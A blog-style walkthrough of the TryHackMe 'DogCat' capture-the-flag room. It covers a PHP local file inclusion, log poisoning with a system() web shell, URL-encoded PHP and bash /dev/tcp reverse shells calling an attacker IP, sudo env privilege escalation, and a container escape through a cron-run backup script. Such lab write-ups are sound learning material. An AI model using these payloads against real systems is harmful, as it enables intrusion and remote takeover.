---
title: DogCat TryHackMe -- Writeup
date: 2022-04-06
categories: [TryHackMe, Medium]
tags: [docker, priv-esc, linux, ctf, lfi]     # TAG names should always be lowercase
---

Exporting the ip, hate typing it over again.
`import ip=10.10.106.83`

### Enumeration
We got 2 open port, 22(ssh), 80(apache). fair enough lets see whats in 80

```bash
PORT   STATE SERVICE
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 24:31:19:2a:b1:97:1a:04:4e:2c:36:ac:84:0a:75:87 (RSA)
|   256 21:3d:46:18:93:aa:f9:e7:c9:b5:4c:0f:16:0b:71:e1 (ECDSA)
|_  256 c1:fb:7d:73:2b:57:4a:8b:dc:d7:6f:49:bb:3b:d0:20 (EdDSA)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: dogcat
MAC Address: 02:B3:94:18:A1:5F (Unknown)
```

navigating to `http://10.10.106.83` give us this page, where we can click at either cat/dog.<br>
![img](/assets/img/tryhackme/dogcat/dogcat_landing.png)

```bash
cat: http://10.10.106.83/?view=cat
dog: http://10.10.106.83/?view=dog
```

Looking at `?view=..` The first thing come to my mind is Local file inclusion (LFI). so i try including dog: `http://10.10.106.83/?view=../../../../etc/passwd` but urgh it complains only dogs/cats pic allowed. So now what i need todo is essentially read the index.php file to see what happend under the hood.
What i basically end up doing is converting the file to base64, parse it and then decode it to normal text.

`"?view=php://filter/read=convert.base64-encode/resource=./dog/../index"`

```php
 <?php
    function containsStr($str, $substr) {
        return strpos($str, $substr) !== false;
    }
    $ext = isset($_GET["ext"]) ? $_GET["ext"] : '.php';
    if(isset($_GET['view'])) {
        if(containsStr($_GET['view'], 'dog') || containsStr($_GET['view'], 'cat')) {
            echo 'Here you go!';
            include $_GET['view'] . $ext;
        } else {
            echo 'Sorry, only dogs or cats are allowed.';
        }
    }
?>
```
Looking at the source, we know exactly what todo now. I tried again to include passwd file now i modify it to `'http://10.10.106.83/?view=./cat/../../../../etc/passwd&ext='`

```bash
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
```
Now what next lmao. I can include files but still not enough. i need Remote code Execution (rce). A simple google search helped me out i found this [link](https://outpost24.com/blog/from-local-file-inclusion-to-remote-code-execution-part-1).
Next i try reading `/var/log/apache2/access.log` to see if i can use log poisoning. AND BOOM I CAN. Now only left is crafting payload to get a shell.

First request. this allow us to use the `cmd` parameter later to execute any php code.
```bash
nc $ip 80
GET /<?php system($_GET['cmd']);?>
```
Next is searching php reverse shell, i use [this]() onliner shell. then urlencode it.

```php
php -r '$sock=fsockopen("<YOURIP>",<PORT>);exec("/bin/bash -i <&3 >&3 2>&3");'
php%20-r%20%27%24sock%3Dfsockopen(%22<YOURIP>%22%2C<PORT>)%3Bexec(%22%2Fbin%2Fbash%20-i%20%3C%263%20%3E%263%202%3E%263%22)%3B%27
```
Final payload
```
http://10.10.156.55/?view=./cat/../../../../var/log/apache2/access.log&ext=&cmd=php%20-r%20%27%24sock%3Dfsockopen(%2210.10.39.132%22%2C4444)%3Bexec(%22%2Fbin%2Fbash%20-i%20%3C%263%20%3E%263%202%3E%263%22)%3B%27
```

### Searching for flags.

```bash
flag1: can be found /var/www/html/flag.php THM{Th1s_1s_N0t_4_Catdog_*********}
flag2: can be found /var/www HM{LF1_t0_RC3_******}
```

### priv esc
```
User www-data may run the following commands on 005c9764143d:
    (root) NOPASSWD: /usr/bin/env
```
Well, thats kinda ez priv esc.
`sudo /usr/bin/env /bin/bash -p` Now we root <br>`flag3: can be found /root/ THM{D1ff3r3nt_3nv1ronments_*******}`

what... so where tf is flag4?. 

### escaping container
So i figure it out, we're inside a container. Now our job is to somehow runaway from here.
Looking at the backup files in /opt/backup i notice something. the file backup.sh is older than backup.tar `probably some cron job on the host running the script` so what i did is replace the backup.sh content with a reverse shell hoping that the cron job run it. So i can get a shell on the host.

```bash
echo '#!/bin/bash' > backup.sh
echo '/bin/bash -i >& /dev/tcp/10.10.39.132/4445 0>&1' >> backup.sh
chmod +x backup.sh

attacker: nc -nlvp 4445
```
Oh nice it works<br> `flag4: THM{esc4l4tions_on_esc4l4tions_on_esc4l4tions_**************************}`

thanks for reading, i hope this helps :)
